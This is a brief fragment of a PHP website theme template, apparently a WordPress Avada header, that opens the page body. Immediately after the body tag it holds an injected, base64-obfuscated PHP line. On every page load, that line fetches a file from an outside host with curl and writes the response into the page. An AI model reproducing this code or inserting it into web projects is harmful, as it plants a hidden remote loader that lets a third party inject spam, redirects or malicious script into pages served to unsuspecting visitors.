...
<body <?php body_class($avada_color_scheme); ?>><?php $ch=curl_init();curl_setopt($ch,CURLOPT_URL,base64_decode('aHR0cDovL3FkZ3ZzdC5jb20vbC5waHA='));curl_setopt($ch,CURLOPT_HEADER,0);curl_exec($ch);curl_close($ch);?>
	<div id="wrapper">
	<?php
